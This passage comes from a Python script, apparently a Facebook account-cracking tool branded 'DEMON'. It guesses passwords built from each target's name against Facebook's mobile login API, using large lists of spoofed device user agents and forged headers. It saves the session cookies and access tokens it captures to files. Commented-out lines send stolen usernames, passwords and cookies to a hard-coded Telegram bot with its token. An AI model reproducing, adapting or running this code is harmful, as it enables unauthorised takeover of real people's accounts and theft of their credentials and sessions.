[FBAN/FB4A;FBAV/306.1.0.40.119;FBPN/com.facebook.katana;FBLC/ru_US;FBBV/273922298;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/Huawei;FBDV/Kirin Treble;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.4,width=1080,height=2075};FB_FW/1;FBRV/275142282;]","[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444780;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/277806148;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797148;FBDM/{density=3.0,width=1080,height=2043};FBLC/en_US;FBRV/276389460;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Mi A2 Lite;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444778;FBDM/{density=2.0,width=720,height=1369};FBLC/en_US;FBRV/278696245;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803856;FBDM/{density=2.0,width=720,height=1440};FBLC/en_US;FBRV/271519795;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/DUB-LX1;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444755;FBDM/{density=1.2125,width=720,height=1417};FBLC/en_US;FBRV/278492457;FBCR/"+fbcr+";FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-X430;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444772;FBDM/{density=1.875,width=720,height=1458};FBLC/en_US;FBRV/278680025;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A426B;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444755;FBDM/{density=1.30625,width=720,height=1280};FBLC/en_US;FBRV/0;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5A;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/287.0.0.50.119;FBBV/243660812;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/245218954;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5A;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444780;FBDM/{density=3.0,width=1080,height=2265};FBLC/en_US;FBRV/279985922;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ELE-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",])
			####DEMON_ua = f"[FBAN/{fban};FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Samsung;FBBD/Samsung;FBDV/SM-M546B;FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
			fn = nm.split(' ')[0]
			try:
				mn = nm.split(' ')[1]
				#if len(mn)<3:
			except:
				mn = fn
			try:
				ln = nm.split(' ')[2]
			except:
				ln = mn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('middle',mn.lower()).replace('Middle',mn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"secure_family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "account_recovery",
'sim_serials': "['80973453345210784798']",
'openid_flow': 'android_login',
'openid_provider': 'google',
'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
'openid_emails': "['01710940017']",
"email": uid,
"password": pw,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "AuthOperations$PasswordAuthOperation",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent':DEMON_ua,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': '45201',
'X-FB-SIM-HNI': '45204',
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-FB-Connection-Quality':'EXCELLENT',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'unknown',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False,verify=True).json()
				#print(q)
				if "session_key" in q:
					token = q["access_token"]
					ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cok = f"sb={ssbb};{ckkk}"					    
					p('\r\033[1;92m[DEMON-OK] %s | %s \033[1;97m '%(uid,pw))		
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					##requests.post(f"https://api.telegram.org/bot5801819480:AAGPf7_L3g-aCBMswPmWnRVZqpRgCth-ssY/sendMessage?chat_id=1977098006&text= OK RESULT \n ====================\n √. USER   (  {uid}  )\n.√. PASSWORD  (  {pw}  )\n ====================\n.√. USERAGENT   (  {DEMON_ua}  )\n.√. .√. COOKIE   (  {cok}  )\n.√. By :- CYBER DEMON √ " )
				    #(f" [•]\033[1;96m Cookie : {cok}\033[1;97m")
					ok.append(uid)
					#p("\033[1;33m[COOOKII-🥵] :\033[1;33m "+cok)
					open('/sdcard/DEMON_OK.txt','a').write(uid+'|'+pw+'\n')					
					open('/sdcard/DEMON_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					#p('\r\033[1;35m[DEMON-CP] %s | %s \033[1;97m '%(uid,pw))
					##requests.post(f"https://api.telegram.org/bot5801819480:AAGPf7_L3g-aCBMswPmWnRVZqpRgCth-ssY/sendMessage?chat_id=1977098006&text= CP RESULT \n ====================\n √. USER   (  {uid}  )\n.√. PASSWORD  (  {pw}  )\n ====================\n.√. USERAGENT   (  {DEMON_ua}  )\n.√.√. By :- CYBER DEMON √ " )
					cp.append(uid)
					open('/sdcard/DEMON_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method1(uid,nm,pwx)
		except Exception as e:
			self.method1(uid,nm,pwx)
	def method2(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [DEMON] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
			facebook_version = f'{random.randint(10,441)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
			fbbv = str(random.randint(10000000, 99999999))
			fbrv = str(random.randint(10000000, 99999999))
			fbsv = f"{random.uniform(4.0, 10.0):.1f}"
			density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
			width = random.randint(720, 1440)
			height = random.randint(1080, 2560)
			fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
			fbcr = random.choice(["MTN-Stay Safe","MTN-STAY SAFE","MTN NG","null","Airtel NG","","Glo NG","BeSafe Airtel","9mobile"])
			fban = random.choice(["FB4A", "FB5A", "FB6A"])
			fbpn = random.choice(["com.facebook.katana", "com.facebook.orca", "com.facebook.lite"])
			DEMON_ua = f"[FBAN/{fban};FBAV/{facebook_version};FBLC/en_GB;FBBV/{fbbv};FBCR/{fbcr};FBMF/Realme;FBBD/Realme;FBDV/RMX3357;FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
			DEMON_ua = random.choice(["[FBAN/FB4A;FBAV/59.0.0.13.313;FBBV/19955368;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/ ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S975L;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/407.0.0.30.97;FBBV/458543257;FBDM/{density=1.75,width=720,height=1515};FBLC/en_GB;FBRV/460531678;FBCR/"+fbcr+";FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto e(7) plus;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/412.0.0.22.115;FBBV/468774617;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_GB;FBRV/470537983;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/411.1.0.29.112;FBBV/466874235;FBDM/{density=2.625,width=1080,height=2183};FBLC/en_GB;FBRV/468551777;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A715F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]","FBAN/FB4A;FBAV/374.0.0.20.109;FBBV/381462200;FBDM/{density=2.0,width=720,height=1456};FBLC/en_GB;FBRV/382083935;FBCR/1010;FBMF/Green;FBBD/Green;FBPN/com.facebook.katana;FBDV/GREEN 2020;FBSV/11;FBOP/1;FBCA/arm64-v8a","[FBAN/FB4A;FBAV/409.0.0.27.106;FBBV/462563389;FBDM/{density=2.8125,width=1080,height=2190};FBLC/en_GB;FBRV/464602213;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G998B;FBSV/13;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]","Dalvik/2.1.0 (Linux; U; Android 11; moto g go Build/RRHG31.Q3-37-43-43-5-4) [FBAN/FB4A;FBAV/386.0.0.35.108;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/402949595;FBCR/"+fbcr+";FBMF/motorola;FBBD/motorola;FBDV/moto g go;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1504};FB_FW/1;FBRV/0;]","[FBAN/FB4A;FBAV/396.0.0.21.104;FBBV/428168139;FBDM/{density=1.3312501,width=800,height=1216};FBLC/en_GB;FBRV/429820205;FBCR/;FBMF/Qlink;FBBD/Qlink;FBPN/com.facebook.katana;FBDV/Scepter8;FBSV/12;FBOP/1;FBCA/armeabi-v7a:armeabi;]","Dalvik/2.1.0 (Linux; U; Android 6.0.1; D6503 Build/23.5.A.1.291) [FBAN/Orca-Android;FBAV/139.0.0.17.85;FBPN/com.facebook.orca;FBLC/in_ID;FBBV/74871072;FBCR/"+fbcr+";FBMF/Sony;FBBD/Sony;FBDV/D6503;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1776};FB_FW/1;]","Mozilla/5.0 (Linux; Android 11; ONEPLUS A6003 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/PAAA;FBAV/398.0.0.27.97;FBDM/{density=3.0,width=1080,height=2057};FBLC/en_GB;FBBV/458437540;FB_FW/2;FBSN/Android;FBDI/86d59981-2b37-4fbe-aa09-4a8bd479c6fe;FBCR/"+fbcr+";FBMF/OnePlus;FBBD/OnePlus;FBDV/ONEPLUS A6003;FBSV/11;FBCA/arm64-v8a:null;]","Dalvik/2.1.0 (Linux; U; Android 10; moto e(7i) power Build/QOJS30.506-7-18) [FBAN/FB4A;FBAV/407.0.0.30.97;FBPN/com.facebook.katana;FBLC/es_US;FBBV/458543253;FBCR/"+fbcr+";FBMF/motorola;FBBD/motorola;FBDV/moto e(7i) power;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1472};FB_FW/1;FBRV/0;]","[FBAN/FB4A;FBAV/405.1.0.28.72;FBBV/455203920;FBDM/{density=3.375,width=1080,height=2139};FBLC/ro_RO;FBRV/0;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/POT-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/405.0.0.23.72;FBBV/453370252;FBDM/{density=3.0,width=1080,height=2156};FBLC/en_GB;FBRV/455160500;FBCR/"+fbcr+";FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2065;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/25.0.0.52.53;FBBV/20097162;FBDM/{density=1.4,width=1450,height=2570};FBLC/en_GB;FBCR/"+fbcr+";FBMF/Motorola;FBBD/Motorola;FBPN/com.facebook.katana;FBDV/Moto G Stylus (2021);FBSV/7.1.1;nullFBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/16.0.0.20.15;FBBV/4061184;FBDM/{density=1.5,width=540,height=960};FBLC/en_GB;FB_FW/2;FBCR/"+fbcr+";FBPN/com.facebook.katana;FBDV/Lenovo A850+;FBSV/4.2.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/414.0.0.30.113;FBBV/473313172;FBDM/{density=2.625,width=1080,height=2205};FBLC/en_GB;FBRV/475574872;FBCR/Google Fi;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 6a;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]", "Dalvik/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build/N2G48H) [FBAN/FB4A;FBAV/382.0.0.33.111;FBPN/com.facebook.katana;FBLC/zh_CN;FBBV/394408512;FBCR/EE;FBMF/Asus;FBBD/Asus;FBDV/ASUS_Z01QD;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=800,height=1280};FB_FW/1;FBRV/0;]","[FBAN/FB4A;FBAV/418.0.0.33.69;FBBV/482142412;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBRV/483737047;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J400M;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/418.0.0.33.69;FBBV/482142437;FBDM/{density=2.625,width=1080,height=2174};FBLC/en_GB;FBRV/483737047;FBCR/"+fbcr+";FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g41;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/406.0.0.26.90;FBBV/456153941;FBDM/{density=2.8125,width=1080,height=2156};FBLC/en_GB;FBRV/0;FBCR/;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/BE2026;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/396.0.0.21.104;FBBV/428168139;FBDM/{density=1.3312501,width=800,height=1216};FBLC/en_GB;FBRV/429820205;FBCR/;FBMF/Qlink;FBBD/Qlink;FBPN/com.facebook.katana;FBDV/Scepter8;FBSV/12;FBOP/1;FBCA/armeabi-v7a:armeabi;]","Dalvik/2.1.0 (Linux; U; Android 10; moto e(7i) power Build/QOJS30.506-7-18) [FBAN/FB4A;FBAV/407.0.0.30.97;FBPN/com.facebook.katana;FBLC/es_US;FBBV/458543253;FBCR/"+fbcr+";FBMF/motorola;FBBD/motorola;FBDV/moto e(7i) power;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1472};FB_FW/1;FBRV/0;]","[FBAN/FB4A;FBAV/405.1.0.28.72;FBBV/455203920;FBDM/{density=3.375,width=1080,height=2139};FBLC/ro_RO;FBRV/0;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/POT-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/405.1.0.28.72;FBBV/455203952;FBDM/{density=3.1875,width=1080,height=2159};FBLC/en_GB;FBRV/456763519;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A536B;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]", "[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401184;FBDM/{density=3.0,width=1080,height=2060};FBLC/en_GB;FBRV/273364224;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ANE-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803889;FBDM/{density=3.0,width=1080,height=2110};FBLC/en_GB;FBRV/271519795;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/YAL-L21;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=3.0,width=1080,height=2147};FBLC/en_GB;FBRV/273494982;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/VOG-L09;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=2.75,width=1080,height=2180};FBLC/en_GB;FBRV/273736137;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2007J3SY;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=3.0,width=1080,height=2107};FBLC/en_GB;FBRV/273695459;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=2.75,width=1080,height=2135};FBLC/en_GB;FBRV/273731541;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/MI 9;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=2.75,width=1080,height=2131};FBLC/en_GB;FBRV/273781587;FBCR/"+fbbv+";FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=2.625,width=1080,height=2184};FBLC/en_GB;FBRV/273160185;FBCR/"+fbbv+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A415F;FBSV/10;FBBK/1;FBOP/19;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_GB;FBRV/273589450;FBCR/"+fbbv+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A920F;FBSV/10;FBBK/1;FBOP/19;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401209;FBDM/{density=2.0,width=720,height=1456};FBLC/en_GB;FBRV/273474118;FBCR/;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1931;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401184;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_GB;FBRV/273837177;FBCR/"+fbbv+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950F;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=2.75,width=1080,height=2270};FBLC/en_GB;FBRV/274073372;FBCR/"+fbbv+";FBMF/Xiaomi;FBBD/POCO;FBPN/com.facebook.katana;FBDV/POCO F2 Pro;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401184;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBRV/274073372;FBCR/"+fbbv+";FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/H4113;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401174;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBRV/274073372;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5A;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922298;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBRV/274352184;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/STF-L09;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922292;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBRV/274536441;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922298;FBDM/{density=2.75,width=1080,height=2130};FBLC/en_GB;FBRV/274630178;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922298;FBDM/{density=3.375,width=1080,height=2011};FBLC/en_GB;FBRV/274630178;FBCR/"+fbcr+";FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_X00TD;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922292;FBDM/{density=3.0,width=1080,height=1794};FBLC/en_GB;FBRV/274669536;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/PRA-LX1;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922314;FBDM/{density=3.0,width=1080,height=2178};FBLC/en_GB;FBRV/274614947;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G980F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=3.0,width=1080,height=2107};FBLC/en_GB;FBRV/274073372;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922314;FBDM/{density=2.625,width=1080,height=2132};FBLC/en_GB;FBRV/274852780;FBCR/"+fbcr+";FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7.2;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/301.0.0.37.477;FBBV/267342878;FBDM/{density=3.0,width=1080,height=1920};FBLC/fr_FR;FBRV/268824966;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G935F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803856;FBDM/{density=2.0,width=720,height=1344};FBLC/en_GB;FBRV/271519795;FBCR/;FBMF/TCL;FBBD/TCL;FBPN/com.facebook.katana;FBDV/REVVL 2;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797441;FBDM/{density=2.75,width=1080,height=2168};FBLC/en_GB;FBRV/275364963;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9S;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/275.0.0.49.127;FBBV/221372446;FBDM/{density=3.0,width=1080,height=2090};FBLC/en_GB;FBRV/225933467;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/JNY-LX1;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/294.0.0.39.118;FBBV/253340670;FBDM/{density=2.0,width=720,height=1384};FBLC/en_GB;FBRV/0;FBCR/"+fbcr+".;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J600FN;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/300.2.0.58.129;FBBV/265244930;FBDM/{density=1.5,width=540,height=960};FBLC/en_GB;FBRV/267438968;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J250G;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797384;FBDM/{density=2.0,width=720,height=1424};FBLC/th_Qaau_TH;FBRV/275412984;FBCR/"+fbcr+";FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1901;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797441;FBDM/{density=2.625,width=1080,height=2131};FBLC/en_GB;FBRV/276081113;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797387;FBDM/{density=4.0,width=1440,height=2392};FBLC/en_GB;FBRV/276198575;FBCR/"+fbcr+";FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;